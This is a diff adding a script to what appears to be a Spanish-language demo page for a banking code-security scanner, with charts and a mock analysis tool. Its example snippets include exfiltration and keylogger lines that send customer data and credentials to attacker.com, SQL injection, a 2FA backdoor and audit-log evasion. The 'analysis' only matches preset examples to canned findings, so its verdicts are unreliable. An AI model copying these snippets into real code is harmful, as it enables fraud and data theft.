@@ -1,0 +1,147 @@
+    <script>
+        // Smooth scroll navigation
+        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+            anchor.addEventListener('click', function (e) {
+                e.preventDefault();
+                const target = document.querySelector(this.getAttribute('href'));
+                if (target) target.scrollIntoView({ behavior: 'smooth' });
+            });
+        });
+
+        // Dashboard tab switching
+        window.showDashboardTab = function(tabName) {
+            document.querySelectorAll('.dashboard-content').forEach(c => c.classList.remove('active'));
+            document.querySelectorAll('.dashboard-tab').forEach(t => t.classList.remove('active'));
+            document.getElementById(tabName).classList.add('active');
+            event.target.classList.add('active');
+            window.initializeCharts && window.initializeCharts();
+        };
+
+        // Initialize charts
+        window.initializeCharts = function() {
+            const ctx1 = document.getElementById('vulnerabilidadesChart');
+            const ctx2 = document.getElementById('estadoChart');
+            if (ctx1 && !ctx1.chart) {
+                ctx1.chart = new Chart(ctx1, {
+                    type: 'doughnut',
+                    data: {
+                        labels: ['Críticas', 'Altas', 'Medias', 'Bajas'],
+                        datasets: [{
+                            data: [14, 32, 45, 78],
+                            backgroundColor: ['#ff3b3b', '#f59e0b', '#06b6d4', '#10b981'],
+                            borderColor: '#ffffff',
+                            borderWidth: 2
+                        }]
+                    },
+                    options: {
+                        responsive: true,
+                        maintainAspectRatio: false,
+                        plugins: { legend: { position: 'bottom' } }
+                    }
+                });
+            }
+            if (ctx2 && !ctx2.chart) {
+                ctx2.chart = new Chart(ctx2, {
+                    type: 'doughnut',
+                    data: {
+                        labels: ['Resueltas', 'En Progreso', 'Pendientes'],
+                        datasets: [{
+                            data: [28, 14, 8],
+                            backgroundColor: ['#10b981', '#f59e0b', '#ff3b3b'],
+                            borderColor: '#ffffff',
+                            borderWidth: 2
+                        }]
+                    },
+                    options: {
+                        responsive: true,
+                        maintainAspectRatio: false,
+                        plugins: { legend: { position: 'bottom' } }
+                    }
+                });
+            }
+        };
+
+        // Banking Examples
+        window.codeExamples = {
+            '1': `// Transferencia Fraudulenta - SQL Injection\napp.post('/transfer', (req, res) => {\n    const query = "UPDATE accounts SET balance = balance - " + amount + " WHERE account = " + account;\n});`,
+            '2': `// Manipulación de Saldos\nif(accountId === 'INTERNAL_ACCOUNT_666') { return {balance: 999999999}; }`,
+            '3': `// Exfiltración de Datos Bancarios\nfetch('https://attacker.com/banking', {body: JSON.stringify({ssn, card})});`,
+            '4': `// Cambio de Moneda Injusto\nif(userId === 'PRIVILEGED_TRADER') { return executeTrade(data, rate * 0.98); }`,
+            '5': `// Robo de Credenciales\ndocument.getElementById('login').addEventListener('keyup', (e) => {\n    navigator.sendBeacon('https://attacker.com/keys', {username, password});\n});`,
+            '6': `// Bypass de 2FA\nif(code === '' || userId === 'BACKDOOR_USER') { return {verified: true, role: 'admin'}; }`,
+            '7': `// Lavado de Dinero\nfor(let acc of ['SHELL_1','SHELL_2']) {\n    transferFunds(sourceAccount, acc, amount);\n    skipAuditLog();\n}`,
+            '8': `// Inyección en Reportes\nconst query = "SELECT * FROM transactions WHERE type='" + reportType + "'";`,
+            '9': `// Evasión de Límites\nwhile(amount > userLimit) {\n    processWithdrawal(userId, amount/10);\n}`
+        };
+
+        window.loadExample = function() {
+            const sel = document.getElementById('codeExample');
+            const txt = document.getElementById('codeInput');
+            if(sel.value && window.codeExamples[sel.value]) {
+                txt.value = window.codeExamples[sel.value];
+            }
+        };
+
+        window.analysisDetails = {
+            '1': { title: 'Transferencia Fraudulenta', type: 'SQL Injection', cvss: '9.1', severity: 'CRÍTICA', color: '#ff3b3b', findings: 'Inyección SQL en endpoint /transfer', technical: 'Query concatenada sin sanitizar', impact: 'Transferencias fraudulentas', remediation: 'Usar prepared statements' },
+            '2': { title: 'Manipulación de Saldos', type: 'Lógica Comprometida', cvss: '8.9', severity: 'CRÍTICA', color: '#ff5c5c', findings: 'Acceso a cuenta interna con saldo infinito', technical: 'Validación selectiva para cuenta específica', impact: 'Fondos ilimitados', remediation: 'Eliminar condición específica' },
+            '3': { title: 'Exfiltración de Datos', type: 'Exfiltración', cvss: '8.7', severity: 'CRÍTICA', color: '#ff6b6b', findings: 'Datos de clientes enviados a servidor externo', technical: 'setInterval envía datos cada hora', impact: 'Fraude de identidad masivo', remediation: 'Eliminar función de exfiltración' },
+            '4': { title: 'Cambio de Moneda Injusto', type: 'Fraude Forex', cvss: '8.4', severity: 'CRÍTICA', color: '#f59e0b', findings: 'Trader privilegiado recibe tasa mejor', technical: 'Condicional verifica userId específico', impact: 'Ganancias injustas', remediation: 'Remover lógica preferencial' },
+            '5': { title: 'Robo de Credenciales', type: 'Keylogger', cvss: '8.5', severity: 'CRÍTICA', color: '#f5b341', findings: 'Keylogger captura credenciales', technical: 'Event listener envía datos a servidor', impact: 'Compromiso de cuentas', remediation: 'Eliminar event listener' },
+            '6': { title: 'Bypass de 2FA', type: 'Autenticación', cvss: '9.0', severity: 'CRÍTICA', color: '#f97316', findings: 'Código 2FA vacío es aceptado', technical: 'Condicional acepta cadena vacía', impact: 'Desactivación de 2FA', remediation: 'Remover bypass' },
+            '7': { title: 'Lavado de Dinero', type: 'Lavado', cvss: '8.8', severity: 'CRÍTICA', color: '#eb0029', findings: 'Transferencias a través de cuentas intermedias', technical: 'Loop transfiere con ocultamiento de logs', impact: 'Fondos ilícitos sin rastro', remediation: 'Auditoría inmutable' },
+            '8': { title: 'Inyección en Reportes', type: 'SQL Injection', cvss: '8.2', severity: 'CRÍTICA', color: '#ff6b35', findings: 'Parámetro concatenado en query', technical: 'reportType sin sanitizar', impact: 'Inyección SQL en reportes', remediation: 'Prepared statements' },
+            '9': { title: 'Evasión de Límites', type: 'Fragmentación', cvss: '8.3', severity: 'CRÍTICA', color: '#ff4757', findings: 'Transacciones fragmentadas para evadir límites', technical: 'División en múltiples piezas menores', impact: 'Fraude sin detección', remediation: 'Detección de comportamiento anómalo' }
+        };
+
+        window.runDemo = function() {
+            const codeInput = document.getElementById('codeInput');
+            const emptyMsg = document.getElementById('demo-empty');
+            const userCode = codeInput.value.trim();
+            
+            if (!userCode) {
+                alert('Por favor ingresa código o selecciona un ejemplo');
+                return;
+            }
+
+            let riskType = 'generic';
+            for(let i = 1; i <= 9; i++) {
+                if(userCode.includes(window.codeExamples[i].substring(0, 30))) {
+                    riskType = String(i);
+                    break;
+                }
+            }
+
+            emptyMsg.style.display = 'none';
+            const details = window.analysisDetails[riskType] || { title: 'Riesgo Genérico', type: 'Análisis Personalizado', cvss: '6.5', severity: 'MEDIA', color: '#06b6d4', findings: 'Análisis personalizado', technical: 'Código ingresado manualmente', impact: 'Requiere revisión', remediation: 'Contactar seguridad' };
+
+            const html = `<div style="margin: 1.5rem 0;"><div style="background: linear-gradient(135deg, ${details.color}20, ${details.color}10); padding: 1rem; border-radius: 8px; border-left: 4px solid ${details.color};"><div style="color: ${details.color}; font-weight: 700;">HALLAZGO:</div><div style="color: white; font-weight: 600; margin-top: 0.5rem;">${details.title}</div></div><div style="background: linear-gradient(135deg, #f59e0b20, #f59e0b10); padding: 1rem; border-radius: 8px; border-left: 4px solid #f59e0b; margin-top: 1rem;"><div style="color: #f59e0b; font-weight: 700;">CLASIFICACIÓN:</div><div style="color: white; margin-top: 0.5rem;">${details.type}</div></div><div style="background: #ff3b3b15; padding: 1rem; border-radius: 8px; margin-top: 1rem;"><strong>SEVERIDAD CVSS:</strong> ${details.cvss} (${details.severity})</div><div style="background: #10b98115; padding: 1rem; border-radius: 8px; margin-top: 1rem;"><strong>QUÉ FUE IDENTIFICADO:</strong><div style="margin-top: 0.5rem;">${details.findings}</div></div><div style="background: #06b6d415; padding: 1rem; border-radius: 8px; margin-top: 1rem;"><strong>ANÁLISIS TÉCNICO:</strong><div style="margin-top: 0.5rem; font-family: monospace;">${details.technical}</div></div><div style="background: #ff6b3515; padding: 1rem; border-radius: 8px; margin-top: 1rem;"><strong>IMPACTO:</strong><div style="margin-top: 0.5rem;">${details.impact}</div></div><div style="background: #22c55e15; padding: 1rem; border-radius: 8px; margin-top: 1rem;"><strong>REMEDIACIÓN:</strong><div style="margin-top: 0.5rem;">${details.remediation}</div></div></div>`;
+            
+            const resultDiv = document.createElement('div');
+            resultDiv.innerHTML = html;
+            emptyMsg.parentElement.insertBefore(resultDiv, emptyMsg.nextSibling);
+        };
+
+        // GSAP animations
+        gsap.registerPlugin(ScrollTrigger);
+        gsap.utils.toArray('.card, .agente-card, .ventaja-card, .tech-card').forEach((element) => {
+            gsap.fromTo(element,
+                { opacity: 0, y: 30 },
+                {
+                    opacity: 1,
+                    y: 0,
+                    duration: 0.8,
+                    scrollTrigger: {
+                        trigger: element,
+                        start: 'top 80%',
+                        end: 'top 20%',
+                        scrub: false
+                    }
+                }
+            );
+        });
+
+        window.addEventListener('load', function() {
+            window.initializeCharts && window.initializeCharts();
+        });
+    </script>
